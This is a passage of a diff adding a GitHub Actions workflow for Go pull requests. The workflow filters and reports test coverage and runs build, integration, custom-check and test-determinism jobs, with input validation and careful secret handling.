+          # Generated API docs
+          /api/
+
+          # E2E and integration test directories
+          /test/e2e/
+          /tests/e2e/
+
+          # Testutil helpers
+          /internal/testutil/
+          DEFAULT_IGNORECOVERUNIT
+            echo "No .ignorecoverunit file found — applying shared module default exclusions"
+          fi
+
+          echo "Filtering coverage with .ignorecoverunit patterns..."
+
+          # Read patterns, filter comments and empty lines, convert to pipe-separated regex
+          PATTERNS=$(grep -v '^#' "$IGNORE_FILE" | grep -v '^[[:space:]]*$' | tr '\n' '|' | sed 's/|$//')
+
+          if [[ -z "$PATTERNS" ]]; then
+            echo "No patterns found in .ignorecoverunit"
+            exit 0
+          fi
+
+          echo "Patterns: $PATTERNS"
+
+          # Convert glob patterns to regex (escape dots, convert * to .*)
+          REGEX_PATTERNS=$(echo "$PATTERNS" | sed 's/\./\\./g' | sed 's/\*/.*/g')
+          echo "Regex patterns: $REGEX_PATTERNS"
+
+          # Keep header line, filter body
+          head -1 coverage.txt > coverage_filtered.txt
+          tail -n +2 coverage.txt | grep -vE "$REGEX_PATTERNS" >> coverage_filtered.txt || true
+
+          BEFORE=$(wc -l < coverage.txt | tr -d ' ')
+          AFTER=$(wc -l < coverage_filtered.txt | tr -d ' ')
+          echo "Filtered coverage: $BEFORE lines -> $AFTER lines"
+
+          mv coverage_filtered.txt coverage.txt
+
+      - name: Calculate coverage
+        id: coverage
+        working-directory: ${{ matrix.app.working_dir }}
+        run: |
+          if [[ -f coverage.txt ]]; then
+            COVERAGE=$(go tool cover -func=coverage.txt | grep '^total:' | awk '{print $3}' | sed 's/%//')
+            echo "coverage=$COVERAGE" >> "$GITHUB_OUTPUT"
+            echo "Total coverage: $COVERAGE%"
+            # Persisted into the artifact (not just $GITHUB_OUTPUT) so the
+            # go-pr-coverage-comment.yml fallback can read it from a different
+            # workflow run, where step outputs of this run aren't reachable.
+            echo "$COVERAGE" > coverage-value.txt
+
+            # Generate coverage by package table
+            {
+              echo "## Coverage by Package"
+              echo ""
+              echo "| Package | Coverage |"
+              echo "|---------|----------|"
+            } > coverage-report.md
+
+            # Aggregate coverage by package
+            go tool cover -func=coverage.txt | grep -v "total:" | awk '
+            {
+              if (NF >= 3) {
+                split($1, parts, ":");
+                filepath = parts[1];
+                split(filepath, pathparts, "/");
+                n = length(pathparts);
+                pkg = "";
+                for (i = 1; i < n; i++) {
+                  if (i > 1) pkg = pkg "/";
+                  pkg = pkg pathparts[i];
+                }
+                cov_str = $NF;
+                gsub(/%/, "", cov_str);
+                cov = cov_str + 0;
+                pkg_lines[pkg] += 1;
+                pkg_coverage[pkg] += cov;
+              }
+            }
+            END {
+              for (p in pkg_coverage) {
+                if (pkg_lines[p] > 0) {
+                  avg = pkg_coverage[p] / pkg_lines[p];
+                  printf "| `%s` | %.1f%% |\n", p, avg;
+                }
+              }
+            }' | sort >> coverage-report.md
+          else
+            echo "coverage=0" >> "$GITHUB_OUTPUT"
+            echo "No coverage file found"
+            echo "No coverage data available" > coverage-report.md
+            echo "0" > coverage-value.txt
+          fi
+
+      - name: Generate HTML coverage report
+        working-directory: ${{ matrix.app.working_dir }}
+        run: |
+          if [[ -f coverage.txt ]]; then
+            go tool cover -html=coverage.txt -o coverage.html
+          fi
+
+      - name: Upload coverage report
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7
+        with:
+          name: coverage-report-${{ matrix.app.name }}
+          path: |
+            ${{ matrix.app.working_dir }}/coverage.txt
+            ${{ matrix.app.working_dir }}/coverage.html
+            ${{ matrix.app.working_dir }}/coverage-report.md
+            ${{ matrix.app.working_dir }}/coverage-value.txt
+          retention-days: 30
+
+      - name: Post coverage comment
+        if: github.event_name == 'pull_request'
+        # PRs from forks don't get MANAGE_TOKEN (custom secrets aren't exposed to
+        # pull_request runs triggered from forks) and fall back to github.token,
+        # which GitHub forces read-only for fork PRs, so this call 403s. That's
+        # expected there — go-pr-coverage-comment.yml (invoked by the caller repo
+        # via a workflow_run stub, which does get a write-scoped token) is the
+        # real delivery path for fork PRs. continue-on-error is scoped to that
+        # expected fork 403 only, so a real failure on a same-repo PR still fails
+        # the job instead of being silently swallowed.
+        continue-on-error: ${{ github.event.pull_request.head.repo.fork == true }}
+        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
+        env:
+          COVERAGE: ${{ steps.coverage.outputs.coverage }}
+          THRESHOLD: ${{ inputs.coverage_threshold }}
+          APP_NAME: ${{ matrix.app.name }}
+          WORKING_DIR: ${{ matrix.app.working_dir }}
+        with:
+          github-token: ${{ secrets.MANAGE_TOKEN || github.token }}
+          script: |
+            const fs = require('fs');
+            const coverage = process.env.COVERAGE;
+            const threshold = process.env.THRESHOLD;
+            const appName = process.env.APP_NAME;
+            const workingDir = process.env.WORKING_DIR;
+            const passFail = parseFloat(coverage) >= parseFloat(threshold) ? '✅ PASS' : '⚠️ BELOW THRESHOLD';
+
+            let coverageReport = '';
+            try {
+              const path = require('path');
+              const fullPath = path.join(process.cwd(), workingDir, 'coverage-report.md');
+              console.log('Reading coverage report from:', fullPath);
+              coverageReport = fs.readFileSync(fullPath, 'utf8');
+              console.log('Coverage report content length:', coverageReport.length);
+            } catch (err) {
+              console.log('Error reading coverage report:', err.message);
+              coverageReport = 'Coverage report not available';
+            }
+
+            const marker = `<!-- coverage-report:${appName} -->`;
+            const body = `${marker}
+            ## 📊 Unit Test Coverage Report: \`${appName}\`
+
+            | Metric | Value |
+            |--------|-------|
+            | **Overall Coverage** | \`${coverage}%\` ${passFail} |
+            | **Threshold** | \`${threshold}%\` |
+
+            ${coverageReport}
+
+            ---
+            *Generated by Go PR Analysis workflow*`;
+
+            // Find and update existing comment or create new one.
+            // Paginated: a PR with more than 30 comments (the default page size)
+            // would otherwise hide the existing coverage comment on a later page,
+            // creating a duplicate every run instead of updating it — and the
+            // fork fallback in go-pr-coverage-comment.yml shares this same marker,
+            // so both delivery paths recognize the same comment.
+            const comments = await github.paginate(github.rest.issues.listComments, {
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: context.issue.number,
+              per_page: 100,
+            });
+
+            const botComment = comments.find(comment => (comment.body || '').includes(marker));
+
+            if (botComment) {
+              console.log('Updating existing comment:', botComment.id);
+              await github.rest.issues.updateComment({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                comment_id: botComment.id,
+                body: body
+              });
+              console.log('Comment updated successfully');
+            } else {
+              console.log('Creating new comment');
+              await github.rest.issues.createComment({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                issue_number: context.issue.number,
+                body: body
+              });
+              console.log('Comment created successfully');
+            }
+
+      - name: Check coverage threshold
+        if: inputs.fail_on_coverage_threshold
+        env:
+          COVERAGE: ${{ steps.coverage.outputs.coverage }}
+          THRESHOLD: ${{ inputs.coverage_threshold }}
+        run: |
+          if (( $(echo "$COVERAGE < $THRESHOLD" | bc -l) )); then
+            echo "::error::Coverage $COVERAGE% is below threshold $THRESHOLD%"
+            exit 1
+          fi
+
+      - name: Coverage summary
+        working-directory: ${{ matrix.app.working_dir }}
+        env:
+          APP_NAME: ${{ matrix.app.name }}
+          COVERAGE: ${{ steps.coverage.outputs.coverage }}
+          THRESHOLD: ${{ inputs.coverage_threshold }}
+        run: |
+          {
+            echo "## Coverage Summary: $APP_NAME"
+            echo ""
+            echo "- **Total Coverage**: ${COVERAGE}%"
+            echo "- **Threshold**: ${THRESHOLD}%"
+            echo ""
+          } >> "$GITHUB_STEP_SUMMARY"
+          if [[ -f coverage.txt ]]; then
+            {
+              echo "### Coverage by Function"
+              echo ""
+              echo '```'
+              go tool cover -func=coverage.txt
+              echo '```'
+            } >> "$GITHUB_STEP_SUMMARY"
+          fi
+
+  # ============================================
+  # BUILD VERIFICATION
+  # ============================================
+  build:
+    name: Build (${{ matrix.app.name }})
+    needs: detect-changes
+    if: needs.detect-changes.outputs.has_changes == 'true' && inputs.enable_build
+    runs-on: ${{ inputs.build_runner_type || vars.GENERAL_RUNNERS || inputs.runner_type }}
+    strategy:
+      fail-fast: false
+      matrix:
+        app: ${{ fromJson(needs.detect-changes.outputs.matrix) }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
+
+      - name: Install system dependencies
+        if: inputs.system_packages != ''
+        env:
+          SYSTEM_PACKAGES: ${{ inputs.system_packages }}
+        run: |
+          mapfile -t PACKAGES < <(printf '%s' "$SYSTEM_PACKAGES" | tr -s '[:space:]' '\n' | grep -v '^[[:space:]]*$')
+          if [[ ${#PACKAGES[@]} -eq 0 ]]; then
+            echo "::notice::No valid package names in system_packages; skipping."
+            exit 0
+          fi
+          for pkg in "${PACKAGES[@]}"; do
+            if [[ "$pkg" == -* ]] || [[ ! "$pkg" =~ ^[A-Za-z0-9][A-Za-z0-9.+:-]*$ ]]; then
+              echo "::error::Invalid apt package token: '$pkg'"
+              exit 1
+            fi
+          done
+          sudo DEBIAN_FRONTEND=noninteractive apt-get update -qq
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends "${PACKAGES[@]}"
+
+      - name: Setup Go
+        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
+        with:
+          go-version: ${{ inputs.go_version }}
+          cache: true
+
+      # An org secret the calling repository has not been granted resolves to an
+      # empty string, not an error. Fail here, naming it, instead of letting a
+      # later step fail obscurely or skip and report success. Fork and Dependabot
+      # runs are left out: GitHub withholds Actions secrets from them by design.
+      - name: Require secrets
+        if: inputs.go_private_modules != '' && github.event.pull_request.head.repo.fork != true && github.actor != 'dependabot[bot]'
+        shell: bash
+        env:
+          MANAGE_TOKEN: ${{ secrets.MANAGE_TOKEN }}
+        run: |
+          set -euo pipefail
+          required=(MANAGE_TOKEN)
+          missing=()
+          for name in "${required[@]}"; do
+            [[ -n "${!name:-}" ]] || missing+=("$name")
+          done
+          if (( ${#missing[@]} > 0 )); then
+            echo "::error::Empty secret(s): ${missing[*]}. Set them on the calling repository or grant it access to the organization secret."
+            exit 1
+          fi
+
+      # Credential-confined prefetch: the token lives only inside the composite
+      # step, which deletes it before any code from the pull request runs. See
+      # src/setup/go-private-modules/README.md.
+      - name: Fetch private Go modules
+        if: inputs.go_private_modules != ''
+        uses: LerianStudio/shared-workflows-public/src/setup/go-private-modules@v1
+        with:
+          go-private-modules: ${{ inputs.go_private_modules }}
+          manage-token: ${{ secrets.MANAGE_TOKEN }}
+          working-dir: ${{ matrix.app.working_dir }}
+
+      - name: Detect Makefile build target
+        id: detect-make
+        working-directory: ${{ matrix.app.working_dir }}
+        run: |
+          if [[ -f "Makefile" ]] || [[ -f "makefile" ]] || [[ -f "GNUmakefile" ]]; then
+            if make -n build >/dev/null 2>&1; then
+              echo "Makefile with 'build' target detected"
+              echo "use_make=true" >> "$GITHUB_OUTPUT"
+            else
+              echo "Makefile exists but no 'build' target found"
+              echo "use_make=false" >> "$GITHUB_OUTPUT"
+            fi
+          else
+            echo "No Makefile found"
+            echo "use_make=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Download dependencies
+        if: steps.detect-make.outputs.use_make != 'true'
+        working-directory: ${{ matrix.app.working_dir }}
+        run: go mod download
+
+      - name: Build (make)
+        if: steps.detect-make.outputs.use_make == 'true'
+        working-directory: ${{ matrix.app.working_dir }}
+        run: make build
+
+      - name: Build (go)
+        if: steps.detect-make.outputs.use_make != 'true'
+        working-directory: ${{ matrix.app.working_dir }}
+        run: go build -v ./...
+
+  # ============================================
+  # INTEGRATION TESTS
+  # ============================================
+  integration-tests:
+    name: Integration Tests (${{ matrix.app.name }})
+    needs: detect-changes
+    if: needs.detect-changes.outputs.has_changes == 'true' && inputs.enable_integration_tests
+    runs-on: ${{ inputs.integration_test_runner_type || vars.GENERAL_RUNNERS || inputs.runner_type }}
+    strategy:
+      fail-fast: false
+      matrix:
+        app: ${{ fromJson(needs.detect-changes.outputs.matrix) }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
+
+      - name: Install system dependencies
+        if: inputs.system_packages != ''
+        env:
+          SYSTEM_PACKAGES: ${{ inputs.system_packages }}
+        run: |
+          mapfile -t PACKAGES < <(printf '%s' "$SYSTEM_PACKAGES" | tr -s '[:space:]' '\n' | grep -v '^[[:space:]]*$')
+          if [[ ${#PACKAGES[@]} -eq 0 ]]; then
+            echo "::notice::No valid package names in system_packages; skipping."
+            exit 0
+          fi
+          for pkg in "${PACKAGES[@]}"; do
+            if [[ "$pkg" == -* ]] || [[ ! "$pkg" =~ ^[A-Za-z0-9][A-Za-z0-9.+:-]*$ ]]; then
+              echo "::error::Invalid apt package token: '$pkg'"
+              exit 1
+            fi
+          done
+          sudo DEBIAN_FRONTEND=noninteractive apt-get update -qq
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends "${PACKAGES[@]}"
+
+      - name: Setup Go
+        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
+        with:
+          go-version: ${{ inputs.go_version }}
+          cache: true
+
+      # An org secret the calling repository has not been granted resolves to an
+      # empty string, not an error. Fail here, naming it, instead of letting a
+      # later step fail obscurely or skip and report success. Fork and Dependabot
+      # runs are left out: GitHub withholds Actions secrets from them by design.
+      - name: Require secrets
+        if: inputs.go_private_modules != '' && github.event.pull_request.head.repo.fork != true && github.actor != 'dependabot[bot]'
+        shell: bash
+        env:
+          MANAGE_TOKEN: ${{ secrets.MANAGE_TOKEN }}
+        run: |
+          set -euo pipefail
+          required=(MANAGE_TOKEN)
+          missing=()
+          for name in "${required[@]}"; do
+            [[ -n "${!name:-}" ]] || missing+=("$name")
+          done
+          if (( ${#missing[@]} > 0 )); then
+            echo "::error::Empty secret(s): ${missing[*]}. Set them on the calling repository or grant it access to the organization secret."
+            exit 1
+          fi
+
+      # Credential-confined prefetch: the token lives only inside the composite
+      # step, which deletes it before any code from the pull request runs. See
+      # src/setup/go-private-modules/README.md.
+      - name: Fetch private Go modules
+        if: inputs.go_private_modules != ''
+        uses: LerianStudio/shared-workflows-public/src/setup/go-private-modules@v1
+        with:
+          go-private-modules: ${{ inputs.go_private_modules }}
+          manage-token: ${{ secrets.MANAGE_TOKEN }}
+          working-dir: ${{ matrix.app.working_dir }}
+
+      # ----------------- Service Container & Test Environment -----------------
+      - name: Parse integration configuration
+        id: integration-config
+        if: inputs.integration_tests_config != ''
+        uses: LerianStudio/shared-workflows-public/src/test/integration-config@v1
+        with:
+          config: ${{ inputs.integration_tests_config }}
+
+      - name: Start service container
+        if: steps.integration-config.outputs.has-service == 'true'
+        uses: LerianStudio/shared-workflows-public/src/test/service-container@v1
+        with:
+          # Unique per matrix leg so two apps sharing a persistent runner cannot
+          # collide on the container name.
+          name: integration-svc-${{ github.run_id }}-${{ strategy.job-index }}
+          image: ${{ steps.integration-config.outputs.service-image }}
+          ports: ${{ steps.integration-config.outputs.service-ports }}
+          env-json: ${{ steps.integration-config.outputs.service-env-json }}
+          health-cmd: ${{ steps.integration-config.outputs.service-health-cmd }}
+          health-timeout: ${{ steps.integration-config.outputs.service-health-timeout }}
+
+      # ----------------- Integration Suite -----------------
+      - name: Run integration tests
+        working-directory: ${{ matrix.app.working_dir }}
+        env:
+          INTEGRATION_TEST_COMMAND: ${{ inputs.integration_test_command }}
+        # The input is a command the caller means to execute. eval runs it in this
+        # step's shell, exactly as the inline expression did, without the value
+        # being spliced into the script text before the shell parses it.
+        run: eval "$INTEGRATION_TEST_COMMAND"
+
+      - name: Verify the integration suite actually ran
+        if: steps.integration-config.outputs.has-guard == 'true'
+        uses: LerianStudio/shared-workflows-public/src/test/go-integration-guard@v1
+        with:
+          packages: ${{ steps.integration-config.outputs.guard-packages }}
+          pattern: ${{ steps.integration-config.outputs.guard-pattern }}
+          args-json: ${{ steps.integration-config.outputs.guard-args-json }}
+          working-dir: ${{ matrix.app.working_dir }}
+
+      # ----------------- Teardown -----------------
+      # always(): the runners can be persistent, so a failed suite must not leave
+      # a container holding the port for the next job.
+      - name: Stop service container
+        if: always() && steps.integration-config.outputs.has-service == 'true'
+        env:
+          NAME: integration-svc-${{ github.run_id }}-${{ strategy.job-index }}
+        run: |
+          echo "::group::Service container logs"
+          docker logs "$NAME" 2>&1 | tail -n 200 || true
+          echo "::endgroup::"
+          docker rm --force "$NAME" > /dev/null 2>&1 || true
+
+  # ============================================
+  # CUSTOM CHECKS
+  # ============================================
+  custom-checks:
+    name: Custom Checks (${{ matrix.app.name }})
+    needs: detect-changes
+    # Deliberately NOT also gated on `custom_checks != ''`. A caller that enables
+    # the gate but leaves the list empty is misconfigured, and skipping the job
+    # silently would report coverage that never happened — the run step warns
+    # instead.
+    if: needs.detect-changes.outputs.has_changes == 'true' && inputs.enable_custom_checks
+    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
+    # This is the only job that runs caller-supplied commands, so it is the one
+    # place an unbounded hang is plausible. Caps the 6h GitHub default while
+    # staying generous enough for a heavy guard.
+    timeout-minutes: 30
+    strategy:
+      fail-fast: false
+      matrix:
+        app: ${{ fromJson(needs.detect-changes.outputs.matrix) }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
+        with:
+          # Caller-supplied make targets run in this workspace; do not leave a
+          # usable git credential behind for them. Private-module access comes
+          # from the explicit git config step below, not from checkout.
+          persist-credentials: false
+
+      - name: Install system dependencies
+        if: inputs.system_packages != ''
+        env:
+          SYSTEM_PACKAGES: ${{ inputs.system_packages }}
+        run: |
+          mapfile -t PACKAGES < <(printf '%s' "$SYSTEM_PACKAGES" | tr -s '[:space:]' '\n' | grep -v '^[[:space:]]*$')
+          if [[ ${#PACKAGES[@]} -eq 0 ]]; then
+            echo "::notice::No valid package names in system_packages; skipping."
+            exit 0
+          fi
+          for pkg in "${PACKAGES[@]}"; do
+            if [[ "$pkg" == -* ]] || [[ ! "$pkg" =~ ^[A-Za-z0-9][A-Za-z0-9.+:-]*$ ]]; then
+              echo "::error::Invalid apt package token: '$pkg'"
+              exit 1
+            fi
+          done
+          sudo DEBIAN_FRONTEND=noninteractive apt-get update -qq
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends "${PACKAGES[@]}"
+
+      - name: Setup Go
+        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
+        with:
+          go-version: ${{ inputs.go_version }}
+          cache: true
+
+      # An org secret the calling repository has not been granted resolves to an
+      # empty string, not an error. Fail here, naming it, instead of letting a
+      # later step fail obscurely or skip and report success. Fork and Dependabot
+      # runs are left out: GitHub withholds Actions secrets from them by design.
+      - name: Require secrets
+        if: inputs.go_private_modules != '' && github.event.pull_request.head.repo.fork != true && github.actor != 'dependabot[bot]'
+        shell: bash
+        env:
+          MANAGE_TOKEN: ${{ secrets.MANAGE_TOKEN }}
+        run: |
+          set -euo pipefail
+          required=(MANAGE_TOKEN)
+          missing=()
+          for name in "${required[@]}"; do
+            [[ -n "${!name:-}" ]] || missing+=("$name")
+          done
+          if (( ${#missing[@]} > 0 )); then
+            echo "::error::Empty secret(s): ${missing[*]}. Set them on the calling repository or grant it access to the organization secret."
+            exit 1
+          fi
+
+      # Credential-confined prefetch: the token lives only inside the composite
+      # step, which deletes it before any code from the pull request runs. See
+      # src/setup/go-private-modules/README.md.
+      - name: Fetch private Go modules
+        if: inputs.go_private_modules != ''
+        uses: LerianStudio/shared-workflows-public/src/setup/go-private-modules@v1
+        with:
+          go-private-modules: ${{ inputs.go_private_modules }}
+          manage-token: ${{ secrets.MANAGE_TOKEN }}
+          working-dir: ${{ matrix.app.working_dir }}
+
+      # Every target runs even if an earlier one fails, so one PR surfaces every
+      # broken guard instead of only the first. CUSTOM_CHECKS is passed via env
+      # (not interpolated into the script) to avoid code injection from inputs.
+      - name: Run custom checks
+        working-directory: ${{ matrix.app.working_dir }}
+        env:
+          CUSTOM_CHECKS: ${{ inputs.custom_checks }}
+        run: |
+          if [ -z "${CUSTOM_CHECKS//[[:space:]]/}" ]; then
+            echo "::warning::enable_custom_checks is true but custom_checks is empty — no checks ran"
+            exit 0
+          fi
+          set +e
+          failures=0
+          while IFS= read -r target; do
+            [ -z "$target" ] && continue
+            if [[ ! "$target" =~ ^[A-Za-z0-9][A-Za-z0-9._-]*$ ]]; then
+              echo "::error::Invalid Makefile target name: '$target'"
+              failures=$((failures + 1))
+              continue
+            fi
+            echo "::group::make $target"
+            make "$target"
+            status=$?
+            echo "::endgroup::"
+            if [ "$status" -ne 0 ]; then
+              echo "::error::Custom check '$target' failed (exit $status)"
+              failures=$((failures + 1))
+            fi
+          done <<< "$CUSTOM_CHECKS"
+          if [ "$failures" -ne 0 ]; then
+            echo "::error::$failures custom check(s) failed"
+            exit 1
+          fi
+
+  # ============================================
+  # TEST DETERMINISM
+  # ============================================
+  test-determinism:
+    name: Test Determinism (${{ matrix.app.name }})
+    needs: detect-changes
+    if: needs.detect-changes.outputs.has_changes == 'true' && inputs.enable_test_determinism
+    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
+    strategy:
+      fail-fast: false
+      matrix:
+        app: ${{ fromJson(needs.detect-changes.outputs.matrix) }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
+
+      - name: Install system dependencies
+        if: inputs.system_packages != ''
+        env:
+          SYSTEM_PACKAGES: ${{ inputs.system_packages }}
+        run: |
+          mapfile -t PACKAGES < <(printf '%s' "$SYSTEM_PACKAGES" | tr -s '[:space:]' '\n' | grep -v '^[[:space:]]*$')
+          if [[ ${#PACKAGES[@]} -eq 0 ]]; then
+            echo "::notice::No valid package names in system_packages; skipping."
+            exit 0
+          fi
+          for pkg in "${PACKAGES[@]}"; do
+            if [[ "$pkg" == -* ]] || [[ ! "$pkg" =~ ^[A-Za-z0-9][A-Za-z0-9.+:-]*$ ]]; then
+              echo "::error::Invalid apt package token: '$pkg'"
+              exit 1
+            fi
+          done
+          sudo DEBIAN_FRONTEND=noninteractive apt-get update -qq
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends "${PACKAGES[@]}"
+
+      - name: Setup Go
+        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
+        with:
+          go-version: ${{ inputs.go_version }}
+          cache: true
+
+      # An org secret the calling repository has not been granted resolves to an
+      # empty string, not an error. Fail here, naming it, instead of letting a
+      # later step fail obscurely or skip and report success. Fork and Dependabot
+      # runs are left out: GitHub withholds Actions secrets from them by design.
+      - name: Require secrets
+        if: inputs.go_private_modules != '' && github.event.pull_request.head.repo.fork != true && github.actor != 'dependabot[bot]'
+        shell: bash
+        env:
+          MANAGE_TOKEN: ${{ secrets.MANAGE_TOKEN }}
+        run: |
+          set -euo pipefail
+          required=(MANAGE_TOKEN)
+          missing=()
+          for name in "${required[@]}"; do
+            [[ -n "${!name:-}" ]] || missing+=("$name")
+          done
+          if (( ${#missing[@]} > 0 )); then
+            echo "::error::Empty secret(s): ${missing[*]}. Set them on the calling repository or grant it access to the organization secret."
+            exit 1
+          fi
+
+      # Credential-confined prefetch: the token lives only inside the composite
+      # step, which deletes it before any code from the pull request runs. See
+      # src/setup/go-private-modules/README.md.
+      - name: Fetch private Go modules
+        if: inputs.go_private_modules != ''
+        uses: LerianStudio/shared-workflows-public/src/setup/go-private-modules@v1
+        with:
+          go-private-modules: ${{ inputs.go_private_modules }}
+          manage-token: ${{ secrets.MANAGE_TOKEN }}
+          working-dir: ${{ matrix.app.working_dir }}
+
+      - name: Run tests ${{ inputs.test_determinism_runs }} times
+        working-directory: ${{ matrix.app.working_dir }}
+        env:
+          DETERMINISM_RUNS: ${{ inputs.test_determinism_runs }}
+        run: |
+          echo "Running tests $DETERMINISM_RUNS times to verify determinism..."
+
+          # Always use go test with shuffle for determinism, regardless of Makefile
+          # The tests job validates that tests pass; this job validates they're deterministic
+          PACKAGES=$(go list ./... | awk '!/\/tests($|\/)/' | awk '!/\/api($|\/)/')
+          if [[ -z "$PACKAGES" ]]; then
+            echo "No packages found after filtering /tests/ and /api/"
+            exit 0
+          fi
+
+          for i in $(seq 1 "$DETERMINISM_RUNS"); do
+            echo "Run $i/$DETERMINISM_RUNS"
+            if ! echo "$PACKAGES" | xargs go test -count=1 -shuffle=on; then
+              echo "Tests failed on run $i"
+              exit 1
+            fi
+          done
+          echo "All $DETERMINISM_RUNS test runs passed (deterministic)"
+
+  # ============================================
+  # NO CHANGES DETECTED
+  # ============================================
+  no-changes:
+    name: No Go Changes
+    needs: detect-changes
+    if: needs.detect-changes.outputs.has_changes != 'true'
+    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
+    steps:
+      - name: Skip
+        run: |
+          echo "No Go code changes detected in monitored paths."
+          echo "Skipping Go analysis workflows."
+
+  # ============================================
+  # RESULT AGGREGATION
+  # ============================================
+  # Reports the pipeline verdict as a workflow output so a caller can gate on the
+  # analysis jobs alone. `always()` because the point is to report on jobs that
+  # were skipped or failed; without it this job would be skipped along with them.
+  results:
+    name: Results
+    needs: [detect-changes, lint, security, tests, coverage, build, integration-tests, custom-checks, test-determinism]
+    if: always()
+    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
+    permissions:
+      contents: read
+    outputs:
+      checks_passed: ${{ steps.aggregate.outputs.checks_passed }}
+    steps:
+      - name: Aggregate results
+        id: aggregate
+        env:
+          # Listed one by one rather than with `needs.*.result`, which here would
+          # be the same set — but keeping it explicit means a job added later is
+          # a deliberate decision to include, not a silent one.
+          RESULTS: >-
+            ${{ needs.detect-changes.result }} ${{ needs.lint.result }}
+            ${{ needs.security.result }} ${{ needs.tests.result }}
+            ${{ needs.coverage.result }} ${{ needs.build.result }}
+            ${{ needs.integration-tests.result }} ${{ needs.custom-checks.result }}
+            ${{ needs.test-determinism.result }}
+        run: |
+          set -euo pipefail
+
+          passed=true
+          for result in $RESULTS; do
+            case "$result" in
+              failure|cancelled) passed=false ;;
+            esac
+          done
+
+          echo "checks_passed=$passed" >> "$GITHUB_OUTPUT"
+          echo "analysis verdict: $passed"
+          echo "job results     : $RESULTS"
+
+  # ============================================
+  # SLACK NOTIFICATION
+  # ============================================
+  notify:
+    name: Notify
+    needs: [detect-changes, lint, security, tests, build, integration-tests, custom-checks, test-determinism]
+    if: always() && inputs.enable_slack_notification && needs.detect-changes.outputs.has_changes == 'true'
+    uses: ./.github/workflows/slack-notify.yml
+    with:
+      status: ${{ (needs.lint.result == 'failure' || needs.security.result == 'failure' || needs.tests.result == 'failure' || needs.build.result == 'failure' || needs.integration-tests.result == 'failure' || needs.custom-checks.result == 'failure' || needs.test-determinism.result == 'failure') && 'failure' || 'success' }}
+      workflow_name: "Go PR Analysis"
+      failed_jobs: ${{ needs.lint.result == 'failure' && 'Lint, ' || '' }}${{ needs.security.result == 'failure' && 'Security, ' || '' }}${{ needs.tests.result == 'failure' && 'Tests, ' || '' }}${{ needs.build.result == 'failure' && 'Build, ' || '' }}${{ needs.integration-tests.result == 'failure' && 'Integration Tests, ' || '' }}${{ needs.custom-checks.result == 'failure' && 'Custom Checks, ' || '' }}${{ needs.test-determinism.result == 'failure' && 'Test Determinism' || '' }}
+    secrets:
+      SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
